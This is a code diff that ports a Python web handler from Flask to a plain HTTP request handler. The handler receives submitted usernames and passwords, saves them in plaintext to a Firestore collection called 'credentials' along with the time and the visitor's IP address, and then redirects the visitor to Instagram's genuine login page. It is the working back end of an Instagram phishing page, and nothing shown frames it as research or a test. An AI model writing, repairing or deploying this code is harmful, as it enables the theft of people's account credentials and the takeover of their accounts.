@@ -1,22 +1,26 @@
-import firebase_admin
-from firebase_admin import credentials, firestore, initialize_app
+from http.server import BaseHTTPRequestHandler
+from urllib.parse import parse_qs
 from datetime import datetime
-from flask import Response
-import json
+import firebase_admin
+from firebase_admin import credentials, firestore
 import os
+import json
 
 # Initialize Firebase once
 if not firebase_admin._apps:
     cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
-    initialize_app(cred)
+    firebase_admin.initialize_app(cred)
 
 db = firestore.client()
 
-def handler(request):
-    if request.method == 'POST':
-        data = request.form
-        username = data.get('username')
-        password = data.get('password')
+class handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        form_data = parse_qs(post_data)
+        
+        username = form_data.get('username', [''])[0]
+        password = form_data.get('password', [''])[0]
         
         if username and password:
             doc_ref = db.collection('credentials').document()
@@ -24,11 +28,9 @@ def handler(request):
                 'username': username,
                 'password': password,
                 'timestamp': datetime.now().isoformat(),
-                'ip_address': request.headers.get('X-Forwarded-For', '')
+                'ip_address': self.headers.get('X-Forwarded-For', '')
             })
         
-        return Response('', status=302, headers={
-            'Location': 'https://www.instagram.com/accounts/login/'
-        })
-    
-    return Response('Method not allowed', status=405)
+        self.send_response(302)
+        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
+        self.end_headers()
